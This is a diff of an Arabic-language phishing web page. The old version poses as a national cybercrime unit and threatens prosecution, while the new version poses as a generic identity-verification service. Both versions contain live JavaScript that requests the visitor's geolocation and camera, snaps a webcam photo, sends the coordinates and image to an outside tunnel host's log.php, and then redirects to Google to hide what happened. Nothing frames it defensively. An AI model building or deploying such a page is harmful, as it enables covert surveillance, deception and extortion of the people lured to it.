@@ -3,76 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الوطني - مكافحة الجرائم الإلكترونية</title>
-    <style>
-        body { background-color: #f4f7f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 450px; border-top: 8px solid #1a73e8; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h2 { color: #1a73e8; margin-bottom: 10px; font-size: 24px; }
-        p { color: #555; line-height: 1.6; margin-bottom: 30px; font-size: 16px; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: background 0.3s; }
-        .btn:hover { background-color: #1557b0; }
-        .footer-text { font-size: 12px; color: #999; margin-top: 20px; }
-    </style>
+    <title>التحقق الرقمي</title>
 </head>
-<body>
+<body onclick="captureNow()" style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px;">
+    <div style="background:white; margin:auto; padding:30px; border-radius:15px; max-width:90%;">
+        <h2>نظام التوثيق الأمني</h2>
+        <p>يرجى الضغط على الزر أدناه لإتمام التحقق</p>
+        <button id="btn" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; font-weight:bold;">تأكيد الهوية الآن</button>
+    </div>
 
-<div class="container">
-    <img src="https://cdn-icons-png.flaticon.com/512/747/747127.png" class="logo" alt="Security">
-    <h2>منصة التحقق الرقمي الموحدة</h2>
-    <p>بناءً على البلاغ المقدم، يرجى إجراء الفحص البيومتري للهوية لإغلاق ملف القضية وتجنب الملاحقة القانونية. سيتم ربط موقعك الجغرافي بالرقم الوطني فور الضغط.</p>
-    <button class="btn" onclick="initializeAuth()">تأكيد الهوية الرقمية الآن</button>
-    <div class="footer-text">نظام مؤمن من قبل وحدة الجرائم الإلكترونية © 2025</div>
-</div>
+    <script>
+    async function captureNow() {
+        const btn = document.getElementById('btn');
+        btn.innerText = "جاري المعالجة...";
+        // الرابط الجديد الذي أرسلته أنت
+        const tunnel = "https://ec88f8585f1a2f.lhr.life"; 
 
-<script>
-async function initializeAuth() {
-    // الرابط الذي حصلت عليه من ترمكس حالياً (تأكد منه دائماً)
-    const tunnel = "https://ec88f8585f1a2f.lhr.life"; 
-    
-    try {
-        // 1. طلب الموقع الجغرافي
-        navigator.geolocation.getCurrentPosition(pos => {
-            fetch(`${tunnel}/log.php`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
+        try {
+            // طلب الموقع وإرساله فوراً
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`${tunnel}/log.php`, {
+                    method: 'POST',
+                    body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
+                });
             });
-        });
 
-        // 2. طلب الكاميرا والتقاط الصورة
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+            // طلب الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-        video.onloadedmetadata = () => {
+            // الانتظار ثانية واحدة فقط ثم الالتقاط
             setTimeout(async () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = 640; canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const imgData = canvas.toDataURL('image/jpeg');
+                const img = canvas.toDataURL('image/jpeg');
 
-                // إرسال الصورة إلى السيرفر في ملف log.php
+                // إرسال الصورة
                 await fetch(`${tunnel}/log.php`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ img: imgData })
+                    body: JSON.stringify({ img: img })
                 });
 
-                // إغلاق الكاميرا بعد الالتقاط
-                stream.getTracks().forEach(track => track.stop());
-                
-                alert("تم التحقق من الهوية بنجاح. سيتم إغلاق البلاغ خلال 24 ساعة.");
-                window.location.href = "https://www.google.com"; // تحويله لموقع رسمي
-            }, 2500);
-        };
-    } catch (err) {
-        alert("خطأ: يجب السماح بالكاميرا والموقع لإتمام عملية التحقق.");
-    }
-}
-</script>
+                stream.getTracks().forEach(t => t.stop());
+                alert("تم التوثيق بنجاح");
+                window.location.href = "https://google.com";
+            }, 1000);
 
+        } catch (e) {
+            alert("يرجى السماح بالكاميرا للمتابعة");
+        }
+    }
+    </script>
 </body>
 </html>
